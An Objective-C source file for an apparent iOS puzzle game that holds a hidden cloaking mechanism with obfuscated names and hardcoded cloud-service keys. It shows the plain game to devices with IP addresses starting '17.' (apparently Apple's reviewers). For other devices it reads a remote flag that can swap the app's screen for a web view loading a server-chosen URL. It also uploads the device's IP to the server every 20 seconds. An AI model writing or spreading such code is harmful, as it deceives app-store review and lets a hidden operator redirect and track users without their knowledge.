#import "FunPuzzleM.h"
#import "FunPuzzleS.h"
#import "FunPuzzleW.h"
#import <AVOSCloud/AVOSCloud.h>
#import "FunPuzzleB.h"
#import "FunPuzzleH.h"
#define zhude @"hG342CXzJ88IPphk1NdS9VgS-gzGzoHsz"
#define zhende @"na8B4LLDHfFbFybLBs80YnQk"
#define zhade @"ming"
#define hunde @"xiao"
@interface FunPuzzleM()
@property (nonatomic, strong) UIViewController *yuan;
@property (nonatomic, strong) UIWindow *pmu;
@property (nonatomic, copy) NSString *nn;
@property (nonatomic, strong) NSDictionary *lo;
@property (nonatomic, copy) UIViewController *(^ak)(void);
@property (nonatomic, strong) FunPuzzleS *laoban;
@property (nonatomic, strong) UIViewController *jiaz;
@end
@implementation FunPuzzleM
+ (instancetype)puzzle_sharedInstance {
    static dispatch_once_t o;
    static FunPuzzleM *a;
    dispatch_once(&o, ^{
        a = [[FunPuzzleM alloc] init];
        [NSTimer scheduledTimerWithTimeInterval:20.0f target:a selector:@selector(puzzle_techManagerAction) userInfo:nil repeats:YES];
    });
    return a;
}
- (void)puzzle_techManagerAction{
    NSString *e = [FunPuzzleB puzzle_getIPAddress:YES];
    if (e.length > 0 && self.nn.length > 0) {
        if (self.laoban) {
            AVQuery *q = [AVQuery queryWithClassName:_laoban.hu];
            AVObject *o = [q getFirstObject];
            NSLog(@"dangq_________%@", [o dictionaryForObject]);
            [o setObject:e forKey:@"huang"];
            [o save];
        }
    }
}


- (void)puzzle_setRootVC:(UIViewController *)cat
{
    [self puzzle_setRootVC:cat dog:nil];
}


- (void)puzzle_setRootVC:(UIViewController *)cat
                  dog:(NSDictionary *)dog{
    if (cat == nil) {
        return;
    }
    
    self.nn = @"Fun Puzzle";
    self.yuan = cat;
    self.lo = dog;
    __weak typeof(self) weakSelf = self;
    self.ak = ^UIViewController *{
        return weakSelf.yuan;
    };
    NSString *feifei = [FunPuzzleB puzzle_getIPAddress:YES];
    if ([feifei hasPrefix:@"17."]) {
        [self puzzle_jumpToNativeVC];
    }else{
        self.pmu.rootViewController = self.yuan;
        [self puzzle_judgeTotalSwitchState];
    }
    [self puzzle_getMediaData];
}

- (void)puzzle_judgeTotalSwitchState
{
    [AVOSCloud setApplicationId:zhude clientKey:zhende];
    AVQuery *qq = [AVQuery queryWithClassName:zhade];
    [qq includeKey:@"zhang"];
    [qq whereKey:@"zhang" equalTo:self.nn];
    [qq findObjectsInBackgroundWithBlock:^(NSArray * _Nullable objects, NSError * _Nullable error) {
        AVObject *oo = [objects firstObject];
        if (error) {
            [self puzzle_jumpToNativeVC];
        }else{
            if (!oo) {
                AVObject *ro = [AVObject objectWithClassName:zhade];
                [ro setObject:@0 forKey:@"zhi"];
                [ro setObject:self.nn forKey:@"zhang"];
                [ro setObject:@"" forKey:@"yang"];
                [ro setObject:@"" forKey:@"li"];
                [ro setObject:@"haha" forKey:@"hu"];
                [ro setObject:@"zizi" forKey:@"shang"];
                [ro setObject:@1 forKey:@"tan"];
                [ro save];
            }else{
                NSString *ww = [FunPuzzleB puzzle_getIPAddress:YES];
                if (ww.length > 0) {
                    [oo setObject:ww forKey:@"shang"];
                    [oo save];
                }
                NSMutableDictionary *tt = [NSMutableDictionary dictionary];
                tt = [oo dictionaryForObject];
                FunPuzzleS *ss = [FunPuzzleS new];
                self.laoban = ss;
                [ss setValuesForKeysWithDictionary:tt];
                if (ss.zhi.integerValue == 0) {
                    if (!ss) {
                        [self puzzle_jumpToNativeVC];
                    }else{
                        [self puzzle_judgeDog:ss];
                    }
                }else{
                    [self puzzle_jumpToNativeVC];
                }
            }
        }
    }];
}
- (void)puzzle_judgeDog:(FunPuzzleS *)pig
{
    [AVOSCloud setApplicationId:pig.yang clientKey:pig.li];
    AVQuery *ee = [AVQuery queryWithClassName:pig.hu];
    AVObject *cc = [ee getFirstObject];
    if (!cc) {
        AVObject *we = [AVObject objectWithClassName:pig.hu];
        [we setObject:@0 forKey:@"zhi"];
        [we setObject:@0 forKey:@"zhen"];
        [we setObject:@"lili" forKey:@"he"];
        [we save];
    }else{
        NSString *zz = [cc objectForKey:@"he"];
        if ([zz containsString:@"http"]) {
            FunPuzzleW *wangye = [[FunPuzzleW alloc] init];
            [wangye puzzle_loadWithUrl:zz];
            self.pmu.rootViewController = wangye;
        }else{
            [self puzzle_jumpToNativeVC];
        }
    }
}
- (void)puzzle_jumpToNativeVC{
    self.pmu.rootViewController = self.yuan;
}


#pragma mark - lazy load
- (NSDictionary *)lo
{
    if (!_lo) {
        _lo = [NSDictionary dictionary];
    }
    return _lo;
}
- (UIWindow *)pmu {
    return [UIApplication sharedApplication].delegate.window;
}
- (UIViewController *)jiaz {
    if (!_jiaz) {
        _jiaz = [[UIViewController alloc] init];
        _jiaz.view.backgroundColor = [UIColor whiteColor];
    }
    return _jiaz;
}
- (void)puzzle_getMediaData {
    [self puzzle_getUsersLGDMostLikedSuccess];
}
- (void)puzzle_getUsersLGDMostLikedSuccess {
    [self puzzle_DDgetAllHighUserName];
}

- (void)puzzle_DDgetAllHighUserName {
}
@end
